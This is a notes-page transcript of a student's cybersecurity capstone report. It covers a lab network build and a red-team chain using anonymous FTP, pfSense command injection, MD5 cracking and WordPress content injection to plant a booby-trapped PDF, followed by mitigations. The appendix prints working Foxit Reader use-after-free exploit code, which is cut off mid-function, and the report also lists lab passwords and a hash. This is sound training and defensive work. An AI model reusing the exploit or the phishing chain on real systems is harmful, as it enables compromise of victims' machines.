---
title: "📄 CYBERCAMP3 Capstone Project (PDF)"
category: digital-forensics
status: tested
tags: [capstone, pdf, red-team, blue-team, vulnerability-assessment, network-security]
updated: 2026-09-21T00:00:00Z
created: 2023-11-22T00:00:00Z
pdf: /notes/files/cybercamp3-capstone.pdf
---

# 📄 CYBERCAMP3 Capstone Project (PDF)

This is a read-only PDF note. The document is displayed in the viewer above and cannot be edited through the notes editor. Use the viewer's built-in search (`Ctrl+F` / `Cmd+F`) to search the PDF itself; the transcript below is also indexed by this website's global note search.

> Controlled educational lab material. The original document contains lab credentials, internal test addresses, and exploit demonstrations. Do not reuse any of them outside the isolated lab.

<details>
<summary>Searchable PDF transcript</summary>

<pre>   Capstone Project  Trainee name: Ahmad Anasweh   Part [0]: Vulnerabilities Understanding  POC 1 UAF POC 2 content injection POC 3 command injection &amp; privilege escalation Part [1]: System Design, Architecture &amp; Administration Environment Architecture IP Plan Services FTP Web Server MySQL  S3 Firewall  Part [2]: Offensive Cybersecurity Executive Summery Attack Narrative Recommendations and Remediation Appendix Part [3]: Defensive Cybersecurity Overview of Systems Artifacts Attack Timeline The MITRE ATTACK Navigator Mapping Remediation Replicated Attack   	  Part [0]  POC 1 # Pointer Overwrite Use-After-Free CVE 2018-9958 2018-9948 CVSS Severity: V3 8.8 Base Score Metrics: AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H Based on National Vulnerability Databases   Is a vulnerability related to incorrect use of dynamic memory during program operation, If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program. The desktop application thinks it has the wanted data, but actually it may not, and there is 3 possibilities on what will happen when the program try to access memory that should not be using anymore, ether it crashes, corrupt the data or cause a vulnerability. Mitigations are as follows: Download the latest version of Foxit   Foxit fixed their use-after-free vulnerabilities with these updates in several ways. 1-Better memory management and replacing the pointers with smart ones:  No need for a unnecessary memory allocations, smart pointers will be used, and using a memory allocator with built-in protections. Garbage Collection Mechanisms are used in the languages such as Java and C# to deallocate unused memory so that it can be used again in better ways, the programmer does not have to worry about memory leaks.  Smart Pointer is a mechanism developed by C++11.  When the object is destroyed, the memory is also released. As a result, the programmer don&#39;t need to delete it because Smart Pointer will handle it. 2- Added additional security checks:  For example, Foxit Reader now checks to make sure that a pointer is not null(empty) before removing it, and it also checks to make sure that a pointer is still valid before accessing the memory (heap) that it points to.  3-Fixed known user-after-free vulnerabilities in their code that is responsible of memory management: Foxit security updates said they identified and fixed several known user-after-free vulnerabilities in Foxit Reader in their code. They started searching for flaws and vulnerability in code to stop similar attacks in the future  POC 2 #: WordPress Core 4.7.0/4.7.1 - Content Injection EDB-ID: 41223  CVSS Severity: V3 7.1 Base Score Metrics: AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L Based on National Vulnerability Databases Calculator Date: 2017-02-02 is a security vulnerability that allows unauthenticated users to edit posts and contents using REST API , to exploit this vulnerability, an attacker would need to send a POST request to the /wp-json/wp/v2/posts or /wp-json/wp/v2/pages endpoint with a JSON payload containing the updated content. The attacker does not need to be logged in or registered in the first place to the WordPress website to do this.  But how could such a thing happen exactly?  Well, the content injection vulnerability was caused by a flaw in the validation in the REST API endpoints for creating and updating pages and posts. the exploit i used for this vulnerability is designed to communicate with the REST API of WordPress 4.7.1, the code uses ‘urlopen’ library which creates http requests and ‘lxml’ library to parse HTML content. It communicates with the WordPress 4.7.1 REST API by sending HTTP requests with JSON payloads to perform the content injection as i want  Mitigations are as follows:  To protect from such vulnerability is update to the 4.7.2 version or the latest version ,which will prevent any content injection attack, the update contains implementation of input validation in the REST API endpoints , that will check any request for editing or updating ether pages or posts (anything editable ), plus the WordPress software now will validate the data too to make sure it does not contain any malicious code. If the user injects malicious data, the WordPress software will reject the injection and prevent the malicious code from being stored in the database or displayed on the website      POC 3 #: PfSense =&lt;2.1.4 Command Injection Vulnerability and privilege escalation CVSS Severity: V3  6.1   Base Score Metrics: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N Based on National Vulnerability Databases Calculator CVE-2014-6305 is a where the attacker injects commands into an application through exploiting the application vulnerability in our case this command injection will lead to privilege escalation which is a gaining an unauthorized higher access by leveraging security flaws These vulnerabilities have been found in a Pfsense 2.1.3 +2.1.4,and for people who don’t what PFsense is, it’s a free open-source firewall software that acts as firewall and router in the same time ,it comes with built-in intrusion detection and prevention (IDS/IPS) and even more features, the whole firewall is bult on FreeBSD which is free and open-source Unix-like operating system descended from the Berkeley Software Distribution (BSD) How and Why: In our case such vulnerability has happened through the  diag_testport.php page in pfSense that allows users to test network ports using the srcport panel. In this case, the vulnerability allows an attacker to manipulate the input parameters through adding   ( ;; ) to the command instead of the port, to inject and execute unauthorized commands. The lack of proper input validation and sanitization in diag_testport.php makes it vulnerable to this type of attack.  Mitigations are as follows: Upgrade to pfSense 2.1.4 How did they fix it:  The srcport value is now checked to ensure that it is a valid port number. The srcport value is now escaped before being passed to the exec() function.   Part [1] System Design, Architecture, &amp; Administration  Environment Architecture / IP Plan Pfesnse WAN int 192.168.70.143/24 Pfsense LAN int 192.168.1.1/24 Windows              192.168.1.2 Lubuntu              192.168.1.3 windows-server 192.168.1.5 FTP SERVER   192.168.1.5 SQL SERVER 192.168.1.5 S3 bucket s3.eu-west-3.amazonaws.com/uvpn.prototype/ WEB SERVER 52.146.145.215 Attacker(kali) 192.168.1.6  Services  FTP (File Transfer Protocol):  Is a network protocol for transmitting files between computers over Transmission Control Protocol/Internet Protocol (TCP/IP) connections, in the environment it used for transferring files between employees, It allows users to upload and download files. Some files that they want to work on or help each other with  Installation Steps: for a small company like this, we going to use FileCOPA FTP  which is a server has only the most necessary features and is yet powerful enough to be a basis for a more complex server, the step and only step is to turn it on and the FTP service will be running automatically  then  enable the anonymous access from the &gt;Users    /  /   Here we can see the access of the ftp server through kali Linux    /  And here the access from windows, as you can see there is already a directory in it for an employee in the company      Web Server:  software and hardware that uses HTTP (Hypertext Transfer Protocol) and other protocols to respond to client requests made over the World Wide Web, in our case we will use a management system called  WordPress which is a free, open-source WordPress software that you can install on your own web host to create a website that’s 100% your own, our employee in this environment will be using the website for needed tasks that need to be done in all branches   Installation Steps: the web server will be hosted on VM with ubuntu OS, the following are the commands that was used with installation 1-sudo apt install apache2   2-sudo systemctl stop apache2.service     3-sudo systemctl start apache2.service 4-sudo systemctl enable apache2.service 5-sudo apt install mysql-server    ==&gt; MySQL database server on your system 6-sudo systemctl stop mysql.service 7-sudo systemctl start mysql.service 8-sudo systemctl enable mysql.service 9-sudo mysql_secure_installation  ==&gt; secure your MySQL installation by setting a root password, 10-sudo apt install php php-mysql php-cgi php-cli php-gd  ==&gt; install php and php modules to work with the MySQL database  11-sudo systemctl restart apache2  12-sudo mysql -u root -p  &gt; CREATE DATABASE wordpressdb;  &gt; SHOW databases;  &gt; CREATE USER &#39;ahmad&#39; IDENTIFIED BY &#39;06162001&#39;;  &gt; GRANT ALL PRIVILEGES on wordpressdb.* to &quot;ahmad&quot;;  &gt; FLUSH PRIVILEGES; 12-wget https://wordpress.org/latest.zip sudo apt install unzip ==&gt; on vulnerable version we manually downloaded it  form WordPress archives 13-unzip latest.zip 14-cd wordpress 15-sudo cp -r * /var/www/html/ 16-cd /var/www/html/  17-sudo chown -R www-data:www-data /var/www/html/ ==&gt; This command changes the ownership of all files and directories in the web server&#39;s document root to the &quot;www-data 18-sudo chmod -R 755 /var/www/html/ ==&gt; making sure the directory is readable by the web server   then we remove the index.html             / This what will the normal employees see, the tasks that they need to do  The website link: http://52.146.145.215/                     MySQL  is a relational database management system based on SQL – Structured Query Language. The application is used for a wide range of purposes, including data warehousing, ecommerce, and logging applications, it may be anything from a simple shopping list to a picture gallery or a place to hold vast amounts of information in a corporate network. In our case it will contain employees&#39; details that can be access from any part in the local network Installation steps: Download XAMP which is an open-source web server solution package. It is mainly used for web application testing on a local host webserver, and download the packages that comes with it, start the service of the Apache and MySQL, to connect to the databases press admin, this automatically redirects the user to a web browser to the following address  /      / Here we added the users Ahmad and test to user accounts so we could access from them / Here we can that access from the employee test and the databases the contain the information about the employees   S3 Bucket (Amazon Simple Storage Service): Is AWS&#39;s cloud storage service, a scalable object storage service, it&#39;s used to store and retrieve data, it stores any kind of data. It&#39;s used in our environment to present a place where the employees from all branches can download templets, pdfs and desktop application form. Installation Steps: To create an S3 bucket, In the left navigation pane,      Choose Create bucket. The Create bucket page opens. For Bucket name, enter a name for your bucket. The bucket name must unique  Choose the policy you want, here the policy is allowing public access to anyone         /   / Admin side of the s3 bucket, public access will only be through the objects links, what I mean is that any public user (employee) will have only the access to the object in the bucket that she/he has the link to, she/he won&#39;t be able to navigate other objects, unless he has the links for them  / Employees will be provided with the object&#39;s links that they need to finish their tasks like this  / When the use the link, the required file or app will start downloading form the bucket Firewall: Pfsense is a free and open-source firewall and router that also features unified threat management, load balancing, multi-WAN, and more, in this environment a Pfsense  firewall will be used as the gateway of the network, monitoring the traffic, and controlling the access  installation steps 1-install iso  2-install it on VMware 3-connect 2 interfaces on the firewall thought the VMware setting&gt;add&gt; network adapter 4- assign the IPs and access the firewall through its IP  //                   Part [2]  RED TEAM ENGAGEMENT REPORT FOR CAPSTONE PROJECT    Executive Summery This Red Team Engagement Report will expose some critical vulnerabilities the company has and other weaknesses that may lead to exploits that demand immediate implementation of the remediation. they are WordPress authentication vulnerability allowing unauthenticated people to inject content into the WordPress posts, firewall (Pfsense) that is vulnerable to command injection that leads to privilege escalation, weak password management, and an PDF application vulnerability, and the use of weak hashing such as md5 for storing the passwords.  Key Findings: 1. Clear Text Credentials     Anonymous FTP login that exposed sensitive information, including usernames and passwords of an employee named lub . An employee ( lub ) machine was accessed using the gained credentials leading to more sensitive Information about lub firewall credentials: Username: lub Password: 06162001 2. Command Injection &amp; Privilege Escalation Exploitation of an older PFsense version&#39;s command injection vulnerability leading to root access to the firewall. While command execution had limitations, file access was still doable, and all files were accessible. 3. Password Hash Weakness Finding hashed passwords with MD5 hash inside &quot;config.xml&quot; file, with successful cracking of MD5 hashes. The compromised password &quot;rightpath&quot; provided another access to the firewall with higher privilege account that belong to “diagnoser” that exposed the whole network traffic  4. Content Injection Vulnerability in WordPress An unpatched WordPress version (4.7.1) with a content injection vulnerability allowed for arbitrary content injection into web pages to edit the tasks post to make the download a pdf that contain can exploit code of UAF Vulnerability. 5. Use-After-Free (UAF) Vulnerability in Foxit Reader Demonstration of a content injection attack targeting employees through a deceptive PDF that is claimed to be the results of their work on the tasks posts on WordPress that contained the ransomware   6. Content Injection Attack Demonstration of a content injection attack targeting employees by a deceiving PDF that is claimed to be the results of their work on the tasks posts on WordPress that contained the ransomware   Recommendations and mitigations: -The IT staff need to update the WordPress, Foxit to the latest version and upgrade the PFsense firewall to mitigate from the identified vulnerabilities which are content injection, command injection and UAF  -Enforce stronger password policies and encryption and hashing practices to protect sensitive information that is transmitted or stored, in our case in the stored ones in FTP server.  -Spread security awareness and training to teach the employees how to protect their organization&#39;s assets, data and financial resources and their own passwords.                   Attack Narrative   Clear Text Credentials  / First, i scanned the whole network, saw FTP and HTTP, so let&#39;s start with ftp and http   / After couple attempts, i found out that you can login as anonymous into the ftp server, i found a file that contains a file sensitive information as the problem he is having, his password, and his username which is &lt;lub:06162001&gt;   / Since the user named assumed (lub) with the password 06162001 for it is telnet, what i must do now is look for machines with their telnet service on, and here i can see one. / Here i connect with the credentials i found; i can see another sensitive data about a boss confronting lub about not following the good security practices, here you can figure out, that there is a WordPress website for the company ,lub has access to the firewall and the password to access it    Command injection &amp; privilege escalation  / In many network setups, a firewall is placed at the boundary between an internal network (e.g., a company&#39;s local area network or LAN) and an external network (e.g., the internet).and in this case the firewall will has the 192.168.1.1 IP        / Here I am logging in as lub /  i can only access the | Diagnostics &gt; Test Port | and another traffic graph that is not working  / Old version of PFsense , had command injection vulnerability that involves executing arbitrary commands on a host operating system (OS) and this looks like and old PFsense version based on the old graphical interface , and after the command inject attempt, it worked, and it didn’t only just work, but gave us the root privilege ,  but there seems to be a problem since I can&#39;t open a reverse shell or execute any command for some type of unknown limitation ,but I still got the ability to read any file I want , so what I do is a small google search on the file that contains the users and their passwords in this PFsense version. The command injection in old PFsense to be specific is in status_services.php. This allows authenticated WebGUI users with privileges for status_services.php to execute commands in the context of the root user. This vulnerability is rated with CVSS Severity: V3 6.1   	 	Password Hash Weakness / And just what i wanted, some guy with a problem, that has concerns about plaintext passwords in “config.xml” file, and this file’s path is (/conf/config.xml)  / Here after opening the file, i can see another user named “diagnoser ” with his hashed password in md5, since the md5 hash is considered compromised /  Using Crackstaion to crack the hash and find the password i are looking for which is “rightpath” / After logging in as “diagnoser” i can see he has the access to almost anything, so i notice in the traffic graph that there is traffic between the employees and this IP, let google the IP and see what it is / Here i can see the WordPress website the boss mentioned before to lub and how he needs to keep checking this website for any updates on the tasks he needs to do   / Using WPScan to scan WordPress website, i can see here that this WordPress version is 4.7.1 which is vulnerable to content injection that makes us be able to attack that injects arbitrary characters into a web page This vulnerability allowed for privilege escalation through the WordPress REST API added in version 4.7.0. One of the REST endpoints within the API allowed for viewing, editing, deleting, and creating posts. But a bug allowed unauthenticated users to edit any post on the site.  Because the Rest API was enabled on all sites running WordPress 4.7.0 or 4.7.1 at the time, many sites were vulnerable. The bug was first found in /wp-includes/rest-api/endpoints/class-wp-rest-postscontroller.php. This makes it possible for an attacker to send a request like /wp-json/wp/v2/posts/postID ?id=content This vulnerability is rated with CVSS Severity: V3 7.1  / And here i can see its only fixed in 4.7.26  Use-After-Free (UAF) &amp; Content Injection  / I did notice an important thing which is there a public s3 bucket to download applications and files from, the company hosts for its employees and here the task asks the employees to download Foxit reader / I can see that the Foxit reader version which is 9.0.1 has a vulnerability called Use-After-Free (UAF) is a vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, making the program accessing a memory that it should not be using anymore, an attacker can use this to remote code execution like running a calculator or a ransomware ,this vulnerability is rated 7.1 on severity  / Here i get the exploit code, to know what this exploit does, it pass arbitrary code — or a reference to it — to a program and navigate to the beginning of the code by using a dangling pointer. In this way, execution of the malicious code can allow the cybercriminal to gain control over a victim’s system./ And convert it into PDF     / After that i name it results and upload it on Wetransfer website that help us accessing the file online  / I take the link from the Wetransfer website and put it in the content file that i will use to deceive the employees thinking it&#39;s important pdf file that contain their results, so they will download it and open it leading the execution of the code inside the pdf to activate the ransomware, (of course I will not use any Ransomware for my personal safety, so i will use an exploit that will open a calculator   ) / Here i can see the exploit that i will use for the content injection  / here is the command i will use for the attack containing the script, URL and the content  / Here after the script has been executed, i can see that content has been added, that contain the fake task and the link that will trick the windows users in the company  / Here is the “ransomware” (calculator) has been launched as soon as the employee opened the pdf Recommendations and Mitigations  Vulnerability 1 #: Command Injection &amp; Privilege Escalation is a where the attacker injects commands into an application through exploiting the application vulnerability in in our case this command injection will lead to privilege escalation which is a gaining an unauthorized higher access by leveraging security flaws In our case such vulnerability has happened through the  diag_testport.php page in pfSense that allows users to test network ports using the srcport panel. In this case, the vulnerability allows an attacker to manipulate the input parameters through adding ( ;; ) to the command instead of the port, to inject and execute unauthorized commands. The lack of proper input validation and sanitization in diag_testport.php makes it vulnerable to this type of attack.  Mitigations are as follows: Upgrade to pfSense 2.1.4 How did they fix it:  “The srcport value is now checked to ensure that it is a valid port number.” “The srcport value is now escaped before being passed to the exec() function.”  Vulnerability 2 #: Content Injection is a security vulnerability that allows unauthenticated users to edit posts and contents using REST API , to exploit this vulnerability, an attacker would need to send a POST request to the /wp-json/wp/v2/posts or /wp-json/wp/v2/pages endpoint with a JSON payload containing the updated content. The attacker does not need to be logged in or registered in the first place to the WordPress website to do this. Mitigations are as follows: To protect from such vulnerability is update to the 4.7.2 version or the latest version ,which will prevent any content injection attack, the update contains implementation of input validation in the REST API endpoints , that will check any request for editing or updating ether pages or posts (anything editable ), plus the WordPress software now will validate the data too to make sure it does not contain any malicious code If the attacker injects malicious data, the new WordPress version will reject the injection and prevent the malicious code from being stored in the database or displayed on the website   Vulnerability 3 #: Use-After-Free (UAF) A vulnerability related to incorrect use of dynamic memory during program operation. If after freeing a memory location, a program does not clear the pointer to that memory, an attacker can use the error to hack the program.  Mitigations are as follows: Download the latest version of Foxit Foxit fixed their use-after-free vulnerabilities in several ways, including:  1-Improved memory management and using smart pointers:   No need for a unnecessary memory allocations, smart pointers will be used , and using a memory allocator with built-in protections. Garbage Collection Mechanisms are used in the languages such as Java and C# to deallocate unused memory so that it can be used again in better ways. The programmer does not have to be concerned about memory leaks. Smart Pointer is a mechanism developed by C++11.  When the object is destroyed, the memory is also released. As a result, the programmer don&#39;t need to delete it because Smart Pointer will handle it. 2- Added additional security checks:   For example, Foxit Reader now checks to make sure that a pointer is not null(empty) before removing it, and it also checks to make sure that a pointer is still valid before accessing the memory (heap) that it points to. 3-Fixed known user-after-free vulnerabilities in their code: Foxit said they identified and fixed several known user-after-free vulnerabilities in Foxit Reader in their code. They started searching for flaws and vulnerability in code to stop similar attacks in the future  Vulnerability 4 #: Clear Text Credentials &amp; anonymous login That sensitive information like passwords is stored without any kind of security ether hashing encrypting like the ones I found in FTP server  Moving any sensitive information on the FTP server and disabling anonymous login making sure no unauthorized access to FTP nor Telnet   Mitigations are as follows: Implement encryption or hashing mechanisms for storing and transmitting credentials. Making only authenticated people able to access the FTP server and removing any sensitive information out of the FTP to somewhere else. And for the clear Credentials must be hashed or compressed with strong password policy, in our case it was removed in case even if he got the access somehow, he won&#39;t find any sensitive information     Vulnerability 5 #: Password Hash Weakness In old versions of PFsense firewalls the hash that was used for the stored passwords in config.xml was md5 which is a vulnerable hash that was compromised.  Mitigations are as follows: Updating the PFsense to the to 2.2.0 update or latest update where the new updates  Because they started using the Bcrypt algorithm to hash user passwords instead of MD5. bcrypt is a stronger hashing algorithm that is more resistant to brute-force attacks and rainbow table attacks.      Appendices  Tool used: NMAP ,WPscan and CrackStaion Tool outputs:  -NMAP # Nmap 7.93 scan initiated Wed Nov  8 08:14:10 2023 as: nmap -A -oN env.txt 192.168.1.0/24 Nmap scan report for 192.168.1.1 Host is up (0.00059s latency). Not shown: 998 filtered tcp ports (no-response) PORT   STATE SERVICE VERSION 53/tcp open  domain  dnsmasq 2.68 | dns-nsid:  |_  bind.version: dnsmasq-2.68 80/tcp open  http    lighttpd 1.4.35 |_http-server-header: lighttpd/1.4.35 |_http-title: Login | http-cookie-flags:  |   /:  |     PHPSESSID:  |_      httponly flag not set   Nmap scan report for 192.168.1.3 Host is up (0.00082s latency). Not shown: 999 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 23/tcp open  telnet 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port23-TCP:V=7.93%I=7%D=11/8%Time=654B89BB%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd\x18\xff\xfd\x20\xff\xfd#\xff\xf SF:d&#39;\xff\xfd\$&quot;)%r(GetRequest,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd\x18\xff\xfd\ SF:x20\xff\xfd#\xff\xfd&#39;\xff\xfd\$&quot;)%r(Help,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd SF:\x18\xff\xfd\x20\xff\xfd#\xff\xfd&#39;\xff\xfd\$&quot;);   Nmap scan report for 192.168.1.5 Host is up (0.00062s latency). Not shown: 995 filtered tcp ports (no-response) PORT     STATE SERVICE  VERSION 21/tcp   open  ftp      Baby FTP Server | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwx------ 1 user group              0 Nov 08 10:17 lub | ftp-syst:  |_  SYST: UNIX emulated by Baby FTP Server. 80/tcp   open  http     Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.2.4) |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 | http-title: Welcome to XAMPP |_Requested resource was http://192.168.1.5/dashboard/ 443/tcp  open  ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.2.4) |_ssl-date: TLS randomness does not represent time | tls-alpn:  |_  http/1.1 | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after:  2019-11-08T23:48:47 | http-title: Welcome to XAMPP |_Requested resource was https://192.168.1.5/dashboard/ |_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.2.4 3306/tcp open  mysql    MySQL 5.5.5-10.4.28-MariaDB | mysql-info:  |   Protocol: 10 |   Version: 5.5.5-10.4.28-MariaDB |   Thread ID: 171 |   Capabilities flags: 63486 |   Some Capabilities: Support41Auth, SupportsLoadDataLocal, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsTransactions, InteractiveClient, FoundRows, IgnoreSigpipes, Speaks41ProtocolNew, Speaks41ProtocolOld, SupportsCompression, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults |   Status: Autocommit |   Salt: &#39;+?&lt;MQ0:sV3=v\I9#?Tk |_  Auth Plugin Name: mysql_native_password 5357/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows   Nmap scan report for 192.168.1.6 Host is up (0.00060s latency). Not shown: 999 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 9.4p1 Debian 1 (protocol 2.0) | ssh-hostkey:  |   256 62e354595339cd5b2de85ae180892ff7 (ECDSA) |_  256 02549de9e5749ae0e0a354d064553b92 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Nmap scan report for 192.168.1.103 Host is up (0.00019s latency). Not shown: 999 closed tcp ports (conn-refused) PORT   STATE SERVICE VERSION 23/tcp open  telnet 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port23-TCP:V=7.93%I=7%D=11/8%Time=654B89BB%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd\x18\xff\xfd\x20\xff\xfd#\xff\xf SF:d&#39;\xff\xfd\$&quot;)%r(GetRequest,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd\x18\xff\xfd\ SF:x20\xff\xfd#\xff\xfd&#39;\xff\xfd\$&quot;)%r(Help,15,&quot;\xff\xfb%\xff\xfb&amp;\xff\xfd SF:\x18\xff\xfd\x20\xff\xfd#\xff\xfd&#39;\xff\xfd\$&quot;)%r(NCP,15,&quot;\xff\xfb%\xff\ SF:xfb&amp;\xff\xfd\x18\xff\xfd\x20\xff\xfd#\xff\xfd&#39;\xff\xfd\$&quot;);   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Nov  8 08:15:25 2023 -- 256 IP addresses (5 hosts up) scanned in 74.50 seconds   -WPscan wpscan --url  http://52.146.145.215  _______________________________________________________________          __          _______   _____          \ \        / /  __ \ / ____|           \ \  /\  / /| |__) | (___   ___  __ _ _ __ &#174;            \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \             \  /\  /  | |     ____) | (__| (_| | | | |              \/  \/   |_|    |_____/ \___|\__,_|_| |_|            WordPress Security Scanner by the WPScan Team                          Version 3.8.24        Sponsored by Automattic - https://automattic.com/        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________   [i] It seems like you have not updated the database for some time. [?] Do you want to update now? [Y]es [N]o, default: [N]n [+] URL: http://52.146.145.215/ [52.146.145.215] [+] Started: Wed Nov  8 08:27:48 2023   Interesting Finding(s):   [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100%   [+] XML-RPC seems to be enabled: http://52.146.145.215/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/   [+] WordPress readme found: http://52.146.145.215/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%   [+] The external WP-Cron seems to be enabled: http://52.146.145.215/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299   [+] WordPress version 4.7.1 identified (Insecure, released on 2017-01-11). | Found By: Rss Generator (Passive Detection) |  - http://52.146.145.215/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.1&lt;/generator&gt; |  - http://52.146.145.215/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.1&lt;/generator&gt;   [+] WordPress theme in use: twentyseventeen | Location: http://52.146.145.215/wp-content/themes/twentyseventeen/ | Last Updated: 2023-03-29T00:00:00.000Z | Readme: http://52.146.145.215/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 3.2 | Style URL: http://52.146.145.215/wp-content/themes/twentyseventeen/style.css?ver=4.7.1 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.1 (80% confidence) | Found By: Style (Passive Detection) |  - http://52.146.145.215/wp-content/themes/twentyseventeen/style.css?ver=4.7.1, Match: &#39;Version: 1.1&#39;   [+] Enumerating All Plugins (via Passive Methods)   [i] No plugins Found.   [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:03 &lt;======================&gt; (137 / 137) 100.00% Time: 00:00:03   [i] No Config Backups Found.   [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register   [+] Finished: Wed Nov  8 08:28:01 2023 [+] Requests Done: 171 [+] Cached Requests: 5 [+] Data Sent: 43.38 KB [+] Data Received: 354.799 KB [+] Memory used: 254.148 MB [+] Elapsed time: 00:00:12  -CrackStaion Hash                                                                           type                           password Bc5a684139d9310b55eca838adcbafe5                     md5                           rightpath   Exploit code: User after free exploit  %PDF  0 obj &lt;&lt;/Pages 1 0 R /OpenAction 2 0 R&gt;&gt;  0 obj &lt;&lt;/S /JavaScript /JS (  /* Foxit Reader Remote Code Execution Exploit ==========================================  Written by: Steven Seeley (mr_me) of Source Incite Date: 22/06/2018 Technical details: https://srcincite.io/blog/2018/06/22/foxes-among-us-foxit-reader-vulnerability-discovery-and-exploitation.html Download: https://www.foxitsoftware.com/downloads/latest.php?product=Foxit-Reader&amp;platform=Windows&amp;version=9.0.1.1049&amp;package_type=exe&amp;language=English Target version: Foxit Reader v9.0.1.1049 (sha1: e3bf26617594014f4af2ef2b72b4a86060ec229f) Tested on:  1. Windows 7 Ultimate x86 build 6.1.7601 sp1  2. Windows 10 Pro x86 v1803 build 10.0.17134 Vulnerabilities leveraged: CVE-2018-9948 CVE-2018-9958 */  var heap_ptr = 0; var foxit_base = 0; var pwn_array = [];  function prepare_heap(size){  /*  This function prepares the heap state between allocations  and frees to get a predictable memory address back.  */  var arr = new Array(size);  for(var i = 0; i &lt; size; i++){  arr[i] = this.addAnnot({type: &quot;Text&quot;});;  if (typeof arr[i] == &quot;object&quot;){  arr[i].destroy();  }  } }  	 function gc() {  /*  This is a simple garbage collector, written by the notorious @saelo  Greetz, mi amigo.  */  const maxMallocBytes = 128 * 0x100000;  for (var i = 0; i &lt; 3; i++) {  var x = new ArrayBuffer(maxMallocBytes);  } }  function alloc_at_leak(){  /*  This is the function that allocates at the leaked address  */  for (var i = 0; i &lt; 0x64; i++){  pwn_array[i] = new Int32Array(new ArrayBuffer(0x40));  } }  function control_memory(){  /*  This is the function that fills the memory address that we leaked  */  for (var i = 0; i &lt; 0x64; i++){  for (var j = 0; j &lt; pwn_array[i].length; j++){  pwn_array[i][j] = foxit_base + 0x01a7ee23; // push ecx; pop esp; pop ebp; ret 4  }  } }  function leak_vtable(){  /*  Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability  ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948  Found by: bit from meepwn team  */   // alloc  var a = this.addAnnot({type: &quot;Text&quot;});   // free  a.destroy();  gc();  	  // kinda defeat lfh randomization in win 10  prepare_heap(0x400);   // reclaim  var test = new ArrayBuffer(0x60);  var stolen = new Int32Array(test);   // leak the vtable  var leaked = stolen[0] &amp; 0xffff0000;   // a hard coded offset to FoxitReader.exe base v9.0.1.1049 (a01a5bde0699abda8294d73544a1ec6b4115fa68)  foxit_base = leaked - 0x01f50000; }  function leak_heap_chunk(){  /*  Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability  ZDI-CAN-5380 / ZDI-18-332 / CVE-2018-9948  Found by: bit from meepwn team  */   // alloc  var a = this.addAnnot({type: &quot;Text&quot;});  	  // free  a.destroy();  	  // kinda defeat lfh randomization in win 10  prepare_heap(0x400);  	 	  // reclaim  var test = new ArrayBuffer(0x60);  var stolen = new Int32Array(test);   // alloc at the freed location  alloc_at_leak();   // leak a heap chunk of size 0x40  heap_ptr = stolen[1]; }  function reclaim(){  /*  This function reclaims the freed chunk, so we can get rce and I 